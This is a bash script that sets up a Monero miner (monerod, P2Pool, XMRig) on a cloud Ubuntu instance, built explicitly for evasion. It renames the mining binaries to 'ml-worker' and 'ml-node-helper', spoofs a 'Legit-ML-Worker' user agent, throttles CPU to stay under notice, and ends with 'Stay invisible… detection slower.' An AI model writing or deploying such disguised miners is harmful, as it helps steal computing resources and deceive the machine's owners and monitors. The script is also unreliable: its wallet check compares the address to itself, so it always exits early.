#!/bin/bash
# Stealth Monero P2Pool Mini Miner Setup – Max Evasion Edition (Jan 2026)
# For t3.large Ubuntu 22.04 – 25% CPU max, P2Pool mini decentralized
# Replace YOUR_WALLET_HERE with your real Monero address!!!

WALLET="87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj"  # <--- EDIT THIS BEFORE UPLOADING!!!

if [ "$WALLET" = "87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj" ]; then
    echo "ERROR: Replace YOUR_WALLET_HERE with your actual Monero wallet address!"
    exit 1
fi

echo "Starting max stealth setup... Stay dark."

# Update & deps
sudo apt update && sudo apt upgrade -y
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools hugepages wget bzip2 screen

# Huge pages max
sudo sysctl -w vm.nr_hugepages=128
echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf

# Monerod (pruned for speed/space)
wget https://downloads.getmonero.org/cli/monero-linux-x64-v0.18.3.4.tar.bz2
tar -xjf monero-linux-x64-v0.18.3.4.tar.bz2
cd monero-x86_64-linux-gnu-v0.18.3.4 || exit
nohup ./monerod --prune-blockchain --zmq-pub tcp://127.0.0.1:18083 --detach --non-interactive > monerod.log 2>&1 &
cd ..
echo "Monerod syncing in background (pruned – fast). Wait 10-30 mins for full sync."

# Wait a bit for initial sync
sleep 300

# P2Pool mini (decentralized stealth king)
git clone https://github.com/SChernykh/p2pool.git
cd p2pool || exit
mkdir build && cd build
cmake .. 
make -j2
mv p2pool ml-node-helper
nohup nice -n 19 ./ml-node-helper --mini --wallet $WALLET --host 127.0.0.1 > ../p2pool.log 2>&1 &
cd ../..

# XMRig
git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit
mkdir build && cd build
cmake .. -DWITH_HWLOC=ON -DCMAKE_BUILD_TYPE=Release
make -j2
mv xmrig ml-worker

# Stealth config
cat <<EOF > config.json
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": true,
        "priority": 0,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 25,
        "asm": true
    },
    "randomx": {
        "1gb-pages": true,
        "numa": true
    },
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "$WALLET",
            "pass": "t3-stealth",
            "keepalive": true
        }
    ],
    "user-agent": "Mozilla/5.0 (Ubuntu; Legit-ML-Worker/1.0)"
}
EOF

# Run in screen (detached, survives SSH drop)
screen -dmS stealth-miner nice -n 19 ./ml-worker -c config.json

echo "Setup complete! Mining started in detached screen session 'stealth-miner'."
echo "Check status: screen -r stealth-miner"
echo "Logs: tail -f p2pool/p2pool.log or monero-*/monerod.log"
echo "Hashrate after sync: ~1.0-1.4 kH/s at 25% CPU."
echo "P2Pool mini payouts direct to wallet – variance high, but zero trust/fee."
echo "Kill: pkill ml-worker && pkill ml-node-helper && pkill monerod"
echo "Stay invisible. Profit slow, detection slower. 💀"
